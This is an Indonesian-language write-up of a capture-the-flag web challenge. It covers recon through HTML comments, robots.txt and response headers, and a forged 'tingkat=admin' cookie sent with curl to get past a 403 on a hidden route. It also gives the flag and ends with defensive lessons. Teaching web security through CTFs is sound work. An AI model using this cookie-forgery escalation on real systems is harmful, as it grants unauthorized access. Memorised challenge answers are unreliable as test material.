# Writeup — Eko-Sistem Pencatatan

- **Kategori:** Web Exploitation (Recon / Information Disclosure / Cookie Manipulation)
- **Poin:** 377 (6 solves) · Babak Eliminasi
- **Service:** http://168.110.219.59:5006/
- **Flag:** `TechtonicExpoCTF{empat_kanal_benteng_D35D4ECD}`

---

## Deskripsi

> Sistem pencatatan Eko-Sistem mengklaim semua datanya aman. Tapi keamanan sejati tidak pernah diiklankan. Ia bersembunyi di tempat yang jarang dilihat.
>
> Admin sistem ini terkenal ceroboh meninggalkan catatan di komentar kode, dan dia menyimpan potongan identitasnya di tiga lapis berbeda: satu di dalam halaman, satu di balik pintu yang katanya dilarang, dan satu yang dipancarkan tanpa diminta ke setiap pengunjung.
>
> Mulailah dari halaman utama. Jangan percaya apa yang tampak. Yang paling mencolok sering kali hanya pengalih perhatian.

Petunjuk kunci dari deskripsi:
- **"satu di dalam halaman" & "catatan di komentar kode"** → Ada potongan string di dalam komentar HTML halaman utama.
- **"satu di balik pintu yang katanya dilarang"** → Halaman tersembunyi yang dilarang aksesnya (petunjuk kuat ke `robots.txt` dan status HTTP 403).
- **"satu yang dipancarkan tanpa diminta ke setiap pengunjung"** → Data yang otomatis terkirim pada setiap response HTTP tanpa diminta secara eksplisit, yaitu **HTTP Response Header**.

---

## Recon

Langkah pertama adalah melakukan *request* ke halaman utama dengan menyertakan header response:

```bash
curl -i http://168.110.219.59:5006/
```

Hasil response header dan body:

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.14
Date: Sat, 05 Sep 2026 02:36:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1290
X-Benteng: benteng
Connection: close

<!DOCTYPE html>
<html lang="id">
...
<!-- simpan_ini: empat -->
<!-- urutkan: mulai dari komentar ini, lalu tempat yang dijaga, lalu yang terpampang -->
</div></body></html>
```

Dari satu *request* ini, kita langsung mendapatkan beberapa petunjuk penting:
1. Komentar HTML berisi potongan kata dan aturan pengurutan.
2. Custom HTTP Header `X-Benteng: benteng`.
3. Server menggunakan Flask/Werkzeug (Python).

---

## Lapis 1 — Di Dalam Halaman (Komentar Kode)

Di bagian akhir berkas HTML halaman utama ditemukan komentar:

```html
<!-- simpan_ini: empat -->
<!-- urutkan: mulai dari komentar ini, lalu tempat yang dijaga, lalu yang terpampang -->
```

- **Potongan 1 = `empat`**
- **Aturan urutan:** 
  1. Komentar ini (`empat`)
  2. Tempat yang dijaga (`...`)
  3. Yang terpampang (`...`)

---

## Lapis 2 — Di Balik Pintu yang Dilarang (`robots.txt` & `/arsip-rahasia`)

Berdasarkan petunjuk *"di balik pintu yang katanya dilarang"*, periksa endpoint standar `/robots.txt`:

```bash
curl -s http://168.110.219.59:5006/robots.txt
```

Respon:

```text
User-agent: *
Disallow: /arsip-rahasia
```

Route `/arsip-rahasia` adalah pintu yang dilarang (*disallowed*). Ketika diakses:

```bash
curl -s http://168.110.219.59:5006/arsip-rahasia
```

Respon berupa **HTTP 403 Forbidden**:

```html
<div class="kartu">
  <div class="label">// AKSES DITOLAK</div>
  <p class="merah">403, kamu bukan bagian dari sistem pencatatan. Tingkat cookie-mu tidak dikenal.</p>
  <p class="abu">Hanya yang tercatat dengan tingkat tertinggi yang bisa melewati pintu ini.</p>
</div>
```

Pesan error secara eksplisit menyebutkan:
> *"Tingkat cookie-mu tidak dikenal. Hanya yang tercatat dengan tingkat tertinggi yang bisa melewati pintu ini."*

Ini mengindikasikan bahwa server mengecek cookie bernama `tingkat` dengan nilai role tertinggi, yaitu `admin`.

Kirim request dengan menyertakan cookie `tingkat=admin`:

```bash
curl -s -H "Cookie: tingkat=admin" http://168.110.219.59:5006/arsip-rahasia
```

Respon:

```html
<!DOCTYPE html><html lang="id"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Arsip Rahasia</title>...
<div class="kartu"><div class="label">// AKSES DIBERIKAN</div><p>Selamat datang, administrator sistem. Potongan yang kamu cari: <code>kanal</code></p></div></div></body></html>
```

Akses berhasil diberikan dan kita mendapatkan potongan kedua:
- **Potongan 2 = `kanal`**

---

## Lapis 3 — Dipancarkan Tanpa Diminta (HTTP Header)

Petunjuk ketiga menyebutkan *"satu yang dipancarkan tanpa diminta ke setiap pengunjung"* dan komentar HTML menyebutnya sebagai *"yang terpampang"*.

Data yang selalu dipancarkan server kepada klien di luar konten halaman adalah **HTTP Response Header**. Pada response header saat mengakses root `/`:

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.12.14
X-Benteng: benteng
Content-Type: text/html; charset=utf-8
```

Terdapat custom header `X-Benteng` dengan nilai `benteng`.
- **Potongan 3 = `benteng`**

---

## Rekonstruksi Kunci & Flag

Sesuai urutan yang ditentukan pada komentar kode:
1. Mulai dari komentar ini $\rightarrow$ `empat`
2. Lalu tempat yang dijaga $\rightarrow$ `kanal`
3. Lalu yang terpampang $\rightarrow$ `benteng`

Sehingga string kunci yang terbentuk:
```text
kunci = empat_kanal_benteng
```

Format flag: `TechtonicExpoCTF{kunci_KODETIM}` dengan kode tim `D35D4ECD`:

```text
TechtonicExpoCTF{empat_kanal_benteng_D35D4ECD}
```

---

## Pelajaran

1. **Information Disclosure di Komentar HTML:** Jangan pernah meninggalkan catatan developer atau konfigurasi internal di source code klien.
2. **Reconnaisance Menyeluruh:** Selalu periksa `robots.txt`, response headers, dan respon status code untuk setiap endpoint.
3. **Insecure Cookie Authentication:** Mengandalkan cookie tanpa penandatanganan kriptografis (*signature* atau *HMAC*) seperti `tingkat=admin` memungkinkan penyerang melakukan *privilege escalation* hanya dengan mengubah parameter cookie secara manual.
